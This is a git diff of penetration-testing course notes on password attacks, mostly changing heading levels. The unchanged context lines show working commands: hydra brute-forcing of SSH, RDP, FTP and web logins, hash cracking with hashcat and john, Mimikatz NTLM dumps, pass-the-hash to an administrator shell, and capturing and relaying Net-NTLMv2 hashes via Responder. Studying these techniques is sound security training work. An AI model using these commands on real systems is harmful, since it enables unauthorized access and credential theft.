@@ -1,8 +1,8 @@
 # Module 15: Password Attacks
 
-### Attacking Network Services Logins
+## Attacking Network Services Logins
 
-#### SSH and RDP
+### SSH and RDP
 
 Brute force SSH with **known username** and **unknown password** on abnormal port number (-t 4 due to SSH commonly limiting parallel tasks to 4):\
 `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 -t 4 ssh://192.168.50.201`
@@ -13,7 +13,7 @@ Brute force RDP with **unknown username** and **known password**:\
 Brute force FTP with **unknown username** and **unknown password:**\
 `hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.50.203`
 
-#### HTTP POST Login Form
+### HTTP POST Login Form
 
 Brute force HTTP POST login form with **unknown username** and **unknown password**:\
 `hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt <target.ip.goes.here> http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"`\
@@ -22,9 +22,9 @@ This targets a webpage hosting a login form at /index.php, followed by a colon, 
 Brute force HTTP GET login form with **known username** and **unknown password**:\
 `hydra -l admin -P /usr/share/wordlists/rockyou.txt <target.ip.goes.here> http-get "/"`
 
-### Password Cracking Fundamentals
+## Password Cracking Fundamentals
 
-#### Introduction to Encryption, Hashes and Cracking
+### Introduction to Encryption, Hashes and Cracking
 
 John the Ripper is more a CPU-based crackin tool, which also supports GPUs.
 
@@ -41,7 +41,7 @@ The keyspace is the character set to teh power of the amount of characters/lengt
 
 A five-character long password would result in the keyspace being 62^5, i.e. 916,132,832 unique variations.
 
-#### Mutating Wordlists
+### Mutating Wordlists
 
 The [_Hashcat Wiki_](https://hashcat.net/wiki/doku.php?id=rule\_based\_attack) provides a list of all possible rule functions with examples.\
 For the example here, we'll append a 1 to every password:
@@ -114,7 +114,7 @@ Using hashcat along with a demo rule to crack a MD5 hash:\
 Premade hashcat rules can be found at:\
 `/usr/share/hashcat/rules/`
 
-#### Cracking Methodology
+### Cracking Methodology
 
 Steps to crack hashes:
 
@@ -129,7 +129,7 @@ Steps to crack hashes:
 5. Attack the hash
    * **Ensure** there are no additional characters, i.e. spaces, newlines, etc. copied into the hash as any additional information will affect it.
 
-#### Password Manager
+### Password Manager
 
 Example scenario: RDP'd onto a device with KeePass installed.
 
@@ -146,7 +146,7 @@ Since KeePass uses a master password without any kind of username, we need to re
 Finding a hash type in hashcat without resorting to searching the Wiki/internet:\
 `hashcat --help | grep -i "KeePass"`
 
-#### SSH Private Key Passphrase
+### SSH Private Key Passphrase
 
 Transform the id\_rsa to a format for **john/hashcat**:\
 `ssh2john id_rsa > ssh.hash`\
@@ -167,9 +167,9 @@ kali@kali:~$ sudo sh -c 'cat /home/kali/ssh.rule >> /etc/john/john.conf'
 kali@kali:~$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
 </code></pre>
 
-### Working with Password Hashes
+## Working with Password Hashes
 
-#### Cracking NTLM
+### Cracking NTLM
 
 Windows stores hashed user passwords in the _Security Account Manager (SAM)_ database file. Modern systems store passwords as NTLM hashes. Older systems may be storing them in _LAN Manager (LM)_ form which is very weak. LM is disabled by default beginning with Vista and Server 2008.
 
@@ -203,7 +203,7 @@ User : nelly
   Hash NTLM: 3ae8e...
 ```
 
-#### Passing NTLM
+### Passing NTLM
 
 Pass-the-Hash (PtH) requires the remote computer to have an account with the same username and password. Since Vista, all Windows versions have _UAC remote restrictions_ enabled by default, meaning pass-the-hash will likely only work for the local _Administrator_ account.
 
@@ -240,7 +240,7 @@ C:\> whoami
 files02\administrator
 </code></pre>
 
-#### Cracking Net-NTLMv2
+### Cracking Net-NTLMv2
 
 _Net-NTLMv2 === NTLMv2_\
 NTLMv2 < Kerberos in terms of security.
@@ -262,7 +262,7 @@ C:\Windows\System32> dir \\192.168.119.2\test
 
 At this point, Responder should have captured the user's NTLMv2-SSP Hash which we can save to a file for cracking. Hashcat uses mode 5600 for NetNTLMv2.
 
-#### Relaying Net-NTLMv2
+### Relaying Net-NTLMv2
 
 Similar to sending the NetNTLMv2 SMB communication to Responder, in this case we'll be forwarding along the hash to another device (we're assuming the time taken to crack the hash isn't feasible). To do so, we'll use the tool _**impacket-ntlmrelayx**_.
 
